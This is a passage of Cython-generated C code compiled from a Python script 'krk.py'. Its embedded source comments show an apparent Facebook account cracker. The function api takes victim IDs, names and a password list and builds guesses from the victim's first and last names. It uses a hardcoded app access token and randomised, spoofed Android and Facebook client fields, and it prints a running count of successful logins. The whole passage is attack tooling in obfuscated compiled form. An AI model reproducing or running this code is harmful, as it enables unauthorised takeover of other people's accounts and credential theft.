static PyObject *__pyx_gb_3krk_3api_2generator4(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */

/* "krk.py":422
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(digits) for _ in range(2))             # <<<<<<<<<<<<<<
 *                         jazoest = li2+j1
 *                         data = {
 */

static PyObject *__pyx_pf_3krk_3api_genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_3krk___pyx_scope_struct_4_genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_3krk___pyx_scope_struct_4_genexpr *)__pyx_tp_new_3krk___pyx_scope_struct_4_genexpr(__pyx_ptype_3krk___pyx_scope_struct_4_genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_3krk___pyx_scope_struct_4_genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 422, __pyx_L1_error)
  } else {
    __Pyx_GOTREF((PyObject *)__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_3krk_3api_2generator4, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_api_locals_genexpr, __pyx_n_s_krk); if (unlikely(!gen)) __PYX_ERR(0, 422, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("krk.api.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF((PyObject *)__pyx_cur_scope);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_3krk_3api_2generator4(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_3krk___pyx_scope_struct_4_genexpr *__pyx_cur_scope = ((struct __pyx_obj_3krk___pyx_scope_struct_4_genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  long __pyx_t_1;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    case 1: goto __pyx_L6_resume_from_yield;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 422, __pyx_L1_error)
  for (__pyx_t_1 = 0; __pyx_t_1 < 2; __pyx_t_1+=1) {
    __pyx_cur_scope->__pyx_v__ = __pyx_t_1;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 422, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 422, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_digits); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 422, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_5 = NULL;
    __pyx_t_6 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
        __pyx_t_6 = 1;
      }
    }
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_t_3};
      __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_6, 1+__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 422, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    }
    __pyx_r = __pyx_t_2;
    __pyx_t_2 = 0;
    __pyx_cur_scope->__pyx_t_0 = __pyx_t_1;
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
    /* return from generator, yielding value */
    __pyx_generator->resume_label = 1;
    return __pyx_r;
    __pyx_L6_resume_from_yield:;
    __pyx_t_1 = __pyx_cur_scope->__pyx_t_0;
    if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 422, __pyx_L1_error)
  }
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  PyErr_SetNone(PyExc_StopIteration);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_Generator_Replace_StopIteration(0);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "krk.py":382
 *                 time.sleep(20)
 *         loop+=1
 * def api(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global ok,loop,sim_id
 */

static PyObject *__pyx_pf_3krk_14api(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_ids, PyObject *__pyx_v_names, PyObject *__pyx_v_passlist) {
  PyObject *__pyx_v_fn = NULL;
  PyObject *__pyx_v_ln = NULL;
  PyObject *__pyx_v_pw = NULL;
  PyObject *__pyx_v_pas = NULL;
  PyObject *__pyx_v_accessToken = NULL;
  PyObject *__pyx_v_fbav = NULL;
  PyObject *__pyx_v_fbbv = NULL;
  PyObject *__pyx_v_android_version = NULL;
  PyObject *__pyx_v_model = NULL;
  PyObject *__pyx_v_build = NULL;
  PyObject *__pyx_v_fblc = NULL;
  PyObject *__pyx_v_fbcr = NULL;
  PyObject *__pyx_v_fbmf = NULL;
  PyObject *__pyx_v_fbbd = NULL;
  PyObject *__pyx_v_fbdv = NULL;
  PyObject *__pyx_v_fbsv = NULL;
  PyObject *__pyx_v_fbca = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_fbdm = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_fbfw = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_fbrv = NULL;
  PyObject *__pyx_v_fban = NULL;
  PyObject *__pyx_v_fbpn = NULL;
  PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_v_random_seed = NULL;
  PyObject *__pyx_v_adid = NULL;
  PyObject *__pyx_v_device_id = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_secure = NULL;
  PyObject *__pyx_v_family = NULL;
  PyObject *__pyx_v_xd = NULL;
  PyObject *__pyx_v_sim_serials = NULL;
  PyObject *__pyx_v_li = NULL;
  PyObject *__pyx_v_li2 = NULL;
  PyObject *__pyx_v_j1 = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_jazoest = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_url = NULL;
  PyObject *__pyx_v_twf = NULL;
  PyObject *__pyx_v_po = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_gb_3krk_3api_2generator4 = 0;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  Py_ssize_t __pyx_t_8;
  PyObject *__pyx_t_9 = NULL;
  int __pyx_t_10;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *(*__pyx_t_14)(PyObject *);
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  PyObject *__pyx_t_19 = NULL;
  PyObject *__pyx_t_20 = NULL;
  Py_ssize_t __pyx_t_21;
  Py_UCS4 __pyx_t_22;
  int __pyx_t_23;
  int __pyx_t_24;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("api", 0);

  /* "krk.py":383
 *         loop+=1
 * def api(ids,names,passlist):
 *         try:             # <<<<<<<<<<<<<<
 *                 global ok,loop,sim_id
 *                 sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "krk.py":385
 *         try:
 *                 global ok,loop,sim_id
 *                 sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()             # <<<<<<<<<<<<<<
 *                 fn = names.split(' ')[0]
 *                 try:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sys); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 385, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_stdout); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 385, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_write); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 385, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_loop); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 385, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_oks); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 385, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_8 = PyObject_Length(__pyx_t_7); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 385, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 385, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_9 = PyTuple_New(2); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 385, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_GIVEREF(__pyx_t_6);
      PyTuple_SET_ITEM(__pyx_t_9, 0, __pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_7);
      PyTuple_SET_ITEM(__pyx_t_9, 1, __pyx_t_7);
      __pyx_t_6 = 0;
      __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyString_Format(__pyx_kp_s_1_37m_ZEA_XD_M2_s_1_37mOK_s_1_3, __pyx_t_9); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 385, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      __pyx_t_10 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
          __pyx_t_10 = 1;
        }
      }
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_9, __pyx_t_7};
        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_10, 1+__pyx_t_10);
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 385, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sys); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 385, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_stdout); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 385, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_flush); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 385, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      __pyx_t_10 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
          __pyx_t_10 = 1;
        }
      }
      {
        PyObject *__pyx_callargs[1] = {__pyx_t_7, };
        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_10, 0+__pyx_t_10);
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 385, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      /* "krk.py":386
 *                 global ok,loop,sim_id
 *                 sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 *                 fn = names.split(' ')[0]             # <<<<<<<<<<<<<<
 *                 try:
 *                         ln = names.split(' ')[1]
 */
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_names, __pyx_n_s_split); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 386, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_7 = NULL;
      __pyx_t_10 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
          __pyx_t_10 = 1;
        }
      }
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_7, __pyx_kp_s__22};
        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_10, 1+__pyx_t_10);
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 386, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }
      __pyx_t_5 = __Pyx_GetItemInt(__pyx_t_4, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 386, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_fn = __pyx_t_5;
      __pyx_t_5 = 0;

      /* "krk.py":387
 *                 sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 *                 fn = names.split(' ')[0]
 *                 try:             # <<<<<<<<<<<<<<
 *                         ln = names.split(' ')[1]
 *                 except:
 */
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_11, &__pyx_t_12, &__pyx_t_13);
        __Pyx_XGOTREF(__pyx_t_11);
        __Pyx_XGOTREF(__pyx_t_12);
        __Pyx_XGOTREF(__pyx_t_13);
        /*try:*/ {

          /* "krk.py":388
 *                 fn = names.split(' ')[0]
 *                 try:
 *                         ln = names.split(' ')[1]             # <<<<<<<<<<<<<<
 *                 except:
 *                         ln = fn
 */
          __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_names, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 388, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_7 = NULL;
          __pyx_t_10 = 0;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_7)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
              __Pyx_INCREF(__pyx_t_7);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_4, function);
              __pyx_t_10 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_7, __pyx_kp_s__22};
            __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_10, 1+__pyx_t_10);
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 388, __pyx_L9_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          }
          __pyx_t_4 = __Pyx_GetItemInt(__pyx_t_5, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 388, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_v_ln = __pyx_t_4;
          __pyx_t_4 = 0;

          /* "krk.py":387
 *                 sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 *                 fn = names.split(' ')[0]
 *                 try:             # <<<<<<<<<<<<<<
 *                         ln = names.split(' ')[1]
 *                 except:
 */
        }
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        goto __pyx_L14_try_end;
        __pyx_L9_error:;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

        /* "krk.py":389
 *                 try:
 *                         ln = names.split(' ')[1]
 *                 except:             # <<<<<<<<<<<<<<
 *                         ln = fn
 *                 for pw in passlist:
 */
        /*except:*/ {
          __Pyx_AddTraceback("krk.api", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_5, &__pyx_t_7) < 0) __PYX_ERR(0, 389, __pyx_L11_except_error)
          __Pyx_XGOTREF(__pyx_t_4);
          __Pyx_XGOTREF(__pyx_t_5);
          __Pyx_XGOTREF(__pyx_t_7);

          /* "krk.py":390
 *                         ln = names.split(' ')[1]
 *                 except:
 *                         ln = fn             # <<<<<<<<<<<<<<
 *                 for pw in passlist:
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 */
          __Pyx_INCREF(__pyx_v_fn);
          __Pyx_XDECREF_SET(__pyx_v_ln, __pyx_v_fn);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          goto __pyx_L10_exception_handled;
        }

        /* "krk.py":387
 *                 sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 *                 fn = names.split(' ')[0]
 *                 try:             # <<<<<<<<<<<<<<
 *                         ln = names.split(' ')[1]
 *                 except:
 */
        __pyx_L11_except_error:;
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
        goto __pyx_L3_error;
        __pyx_L10_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
        __pyx_L14_try_end:;
      }

      /* "krk.py":391
 *                 except:
 *                         ln = fn
 *                 for pw in passlist:             # <<<<<<<<<<<<<<
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 */
      if (likely(PyList_CheckExact(__pyx_v_passlist)) || PyTuple_CheckExact(__pyx_v_passlist)) {
        __pyx_t_7 = __pyx_v_passlist; __Pyx_INCREF(__pyx_t_7); __pyx_t_8 = 0;
        __pyx_t_14 = NULL;
      } else {
        __pyx_t_8 = -1; __pyx_t_7 = PyObject_GetIter(__pyx_v_passlist); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 391, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_14 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_7); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 391, __pyx_L3_error)
      }
      for (;;) {
        if (likely(!__pyx_t_14)) {
          if (likely(PyList_CheckExact(__pyx_t_7))) {
            if (__pyx_t_8 >= PyList_GET_SIZE(__pyx_t_7)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_5 = PyList_GET_ITEM(__pyx_t_7, __pyx_t_8); __Pyx_INCREF(__pyx_t_5); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 391, __pyx_L3_error)
            #else
            __pyx_t_5 = PySequence_ITEM(__pyx_t_7, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 391, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            #endif
          } else {
            if (__pyx_t_8 >= PyTuple_GET_SIZE(__pyx_t_7)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_5 = PyTuple_GET_ITEM(__pyx_t_7, __pyx_t_8); __Pyx_INCREF(__pyx_t_5); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 391, __pyx_L3_error)
            #else
            __pyx_t_5 = PySequence_ITEM(__pyx_t_7, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 391, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            #endif
          }
        } else {
          __pyx_t_5 = __pyx_t_14(__pyx_t_7);
          if (unlikely(!__pyx_t_5)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 391, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_5);
        }
        __Pyx_XDECREF_SET(__pyx_v_pw, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":392
 *                         ln = fn
 *                 for pw in passlist:
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())             # <<<<<<<<<<<<<<
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 */
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_v_pw, __pyx_n_s_replace); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 392, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_19 = __Pyx_PyObject_GetAttrStr(__pyx_v_fn, __pyx_n_s_lower); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 392, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_19);
        __pyx_t_20 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_19))) {
          __pyx_t_20 = PyMethod_GET_SELF(__pyx_t_19);
          if (likely(__pyx_t_20)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_19);
            __Pyx_INCREF(__pyx_t_20);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_19, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_20, };
          __pyx_t_18 = __Pyx_PyObject_FastCall(__pyx_t_19, __pyx_callargs+1-__pyx_t_10, 0+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
          if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 392, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
        }
        __pyx_t_19 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
          __pyx_t_19 = PyMethod_GET_SELF(__pyx_t_17);
          if (likely(__pyx_t_19)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
            __Pyx_INCREF(__pyx_t_19);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_17, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_19, __pyx_n_s_first, __pyx_t_18};
          __pyx_t_16 = __Pyx_PyObject_FastCall(__pyx_t_17, __pyx_callargs+1-__pyx_t_10, 2+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
          if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 392, __pyx_L3_error)
